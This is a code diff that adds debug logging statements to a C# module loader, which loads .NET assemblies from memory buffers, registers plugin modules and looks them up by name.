@@ -28,6 +28,7 @@ namespace Workflow.Providers
         
         private bool TryLoadModule(string name, out IModule? plugOut)
         {
+            DebugLog.Log($"TryLoadModule: attempting load by assembly name: {name}");
             plugOut = null;
             try
             {
@@ -35,6 +36,7 @@ namespace Workflow.Providers
 
                 if(_tasksAsm is null)
                 {
+                    DebugLog.Log($"TryLoadModule: assembly null for {name}");
                     return false;
                 }
 
@@ -45,6 +47,7 @@ namespace Workflow.Providers
             }
             catch (Exception e)
             {
+                DebugLog.Log($"TryLoadModule: exception for {name}: {e.Message}");
             }
             return false;
 
@@ -52,9 +55,11 @@ namespace Workflow.Providers
 
         public bool LoadAssemblyAsync(string task_id, byte[] buf)
         {
+            DebugLog.Log($"LoadAssemblyAsync: loading assembly [{task_id}]");
             try
             {
                 var loadedAssembly = this.loadContext.LoadFromStream(new MemoryStream(buf));
+                DebugLog.Log($"LoadAssemblyAsync: success [{task_id}]");
                 messageManager.AddTaskResponse(new TaskResponse
                 {
                     task_id = task_id,
@@ -65,6 +70,7 @@ namespace Workflow.Providers
             }
             catch (Exception e)
             {
+                DebugLog.Log($"LoadAssemblyAsync: failed [{task_id}]: {e.Message}");
                 messageManager.AddTaskResponse(new TaskResponse
                 {
                     task_id = task_id,
@@ -77,6 +83,7 @@ namespace Workflow.Providers
         }
         public bool LoadModuleAsync(string task_id, string moduleName, byte[] buf)
         {
+            DebugLog.Log($"LoadModuleAsync: {moduleName} [{task_id}]");
             try {
                 var loadedAssembly = this.loadContext.LoadFromStream(new MemoryStream(buf));
 
@@ -94,11 +101,14 @@ namespace Workflow.Providers
 
                 if (this.ParseAssemblyForModule(loadedAssembly))
                 {
+                    DebugLog.Log($"LoadModuleAsync: success {moduleName}");
                     return true;
                 }
+                DebugLog.Log($"LoadModuleAsync: no IModule found in assembly for {moduleName}");
             }
             catch (Exception e)
             {
+                DebugLog.Log($"LoadModuleAsync: failed {moduleName}: {e.Message}");
                 this.messageManager.AddTaskResponse(new LoadTaskResponse
                 {
                     completed = true,
@@ -118,7 +128,7 @@ namespace Workflow.Providers
                 {
                     IModule plug = (IModule)Activator.CreateInstance(t, messageManager, agentConfig, logger, tokenManager, spawner, pythonManager);
                     this.loadedModules.GetOrAdd(plug.Name, plug);
-
+                    DebugLog.Log($"ParseAssemblyForModule: found IModule type {t.Name} as {plug.Name}");
                     return true;
                 }
             }
@@ -126,6 +136,7 @@ namespace Workflow.Providers
         }
         public bool TryGetModule<T>(string name, out T? plugin) where T : IModule
         {
+            DebugLog.Log($"TryGetModule: looking up {name}");
             IModule plug = null;
 
 
@@ -133,11 +144,13 @@ namespace Workflow.Providers
             {
                 if (plug is T typedPlugin)
                 {
+                    DebugLog.Log($"TryGetModule: found {name}");
                     plugin = typedPlugin;
                     return true;
                 }
             }
 
+            DebugLog.Log($"TryGetModule: not found {name}");
             plugin = default(T);
             return false;
         }
